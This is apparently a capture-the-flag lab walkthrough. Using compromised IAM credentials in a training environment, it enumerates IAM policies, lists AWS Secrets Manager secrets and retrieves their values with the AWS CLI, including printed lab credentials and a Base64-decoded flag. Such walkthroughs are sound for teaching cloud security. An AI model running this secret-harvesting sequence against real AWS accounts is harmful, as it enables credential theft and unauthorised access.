# AWS Secrets Manager Enumeration - Pwned Labs Walkthrough

## Lab Overview

This lab focuses on enumerating AWS Secrets Manager using compromised IAM credentials and identifying accessible secrets through IAM policy analysis. The objective is to discover the stored secret and recover the flag.

---

## Initial Credentials

The lab provided the following AWS credentials:

```bash
AWS Access Key ID: AKIAYHOR5GKHSK7X2OHY
AWS Secret Access Key: [REDACTED]
Region: us-east-1
```

Configure the AWS CLI:

```bash
aws configure
```

Verify the identity associated with the credentials:

```bash
aws sts get-caller-identity
```

Output:

```json
{
    "UserId": "AIDAYHOR5GKH7ACHQ2LUI",
    "Account": "565765288591",
    "Arn": "arn:aws:iam::565765288591:user/Julie"
}
```

### Finding

The compromised credentials belong to the IAM user **Julie**.

---

## Step 1: Enumerate IAM Permissions

Check for inline policies attached to the user:

```bash
aws iam list-user-policies --user-name Julie
```

Output:

```json
{
    "PolicyNames": [
        "AllowReadSecretsManager"
    ]
}
```

Retrieve the policy contents:

```bash
aws iam get-user-policy \
    --user-name Julie \
    --policy-name AllowReadSecretsManager
```

### Key Discovery

The policy granted:

#### IAM Enumeration Permissions

```text
iam:ListPolicies
iam:ListPolicyVersions
iam:GetPolicy
iam:GetUser
iam:GetUserPolicy
iam:ListUserPolicies
```

#### Secrets Manager Permissions

```text
secretsmanager:GetSecretValue
secretsmanager:ListSecretVersionIds
secretsmanager:GetResourcePolicy
secretsmanager:DescribeSecret
```

The policy also revealed the allowed secret ARNs:

```text
sm-enumerate-password*
sm-enumerate-api-key*
```

This immediately identifies two potential targets:

- sm-enumerate-password
- sm-enumerate-api-key

---

## Step 2: Enumerate Available Secrets

List secrets within the account:

```bash
aws secretsmanager list-secrets
```

Output revealed:

```text
sm-enumerate-password
```

with metadata including tags and descriptions.

### Observation

The policy already indicated another secret named:

```text
sm-enumerate-api-key
```

Even though only one secret appeared in the truncated output, the policy suggested both should be investigated.

---

## Step 3: Enumerate Secret Versions

Check secret versions:

```bash
aws secretsmanager list-secret-version-ids \
    --secret-id sm-enumerate-password
```

Output:

```json
{
  "Versions": [
    {
      "VersionStages": ["AWSCURRENT"]
    }
  ]
}
```

### Purpose

This confirms:

- The secret exists
- A current version is available
- The user has permission to enumerate version metadata

---

## Step 4: Check Resource Policies

Inspect resource policies attached to the secrets.

Password secret:

```bash
aws secretsmanager get-resource-policy \
    --secret-id sm-enumerate-password
```

API key secret:

```bash
aws secretsmanager get-resource-policy \
    --secret-id sm-enumerate-api-key
```

### Observation

Both secrets were accessible and returned valid metadata.

This confirmed the secret names were correct and reachable with the current permissions.

---

## Step 5: Retrieve Secret Values

Read the API key secret:

```bash
aws secretsmanager get-secret-value \
    --secret-id sm-enumerate-api-key
```

Output:

```json
{
  "SecretString": "{\"secret-api-key\":\"Y3lici1sYWJzLWZha2UtYXBpLWtleS0xMTIy\"}"
}
```

The value appears Base64 encoded.

---

Read the password secret:

```bash
aws secretsmanager get-secret-value \
    --secret-id sm-enumerate-password
```

Output:

```json
{
  "SecretString": "{\"password\":\"cybr-labs-are-super-fun-2211\"}"
}
```

Although interesting, this value was not the flag.

---

## Step 6: Decode the API Key

Decode the Base64 string:

```bash
echo "Y3lici1sYWJzLWZha2UtYXBpLWtleS0xMTIy" | base64 --decode
```

Output:

```text
cybr-labs-fake-api-key-1122
```

---

## Flag

```text
cybr-labs-fake-api-key-1122
```

---

## Methodology Summary

1. Configure AWS CLI using provided credentials.
2. Identify the active IAM principal using `sts get-caller-identity`.
3. Enumerate attached inline IAM policies.
4. Review policy permissions and identify allowed Secrets Manager resources.
5. Enumerate secrets and secret versions.
6. Retrieve secret values using `GetSecretValue`.
7. Analyze secret contents for encoded data.
8. Decode the Base64 value.
9. Submit the recovered flag.

---

## Key Takeaways

- IAM policy enumeration often reveals valuable attack paths.
- Secrets Manager ARNs can disclose hidden resources even before they are enumerated directly.
- Always inspect retrieved secret values for encoding such as Base64.
- `GetSecretValue` is one of the most sensitive Secrets Manager permissions and should be tightly controlled.
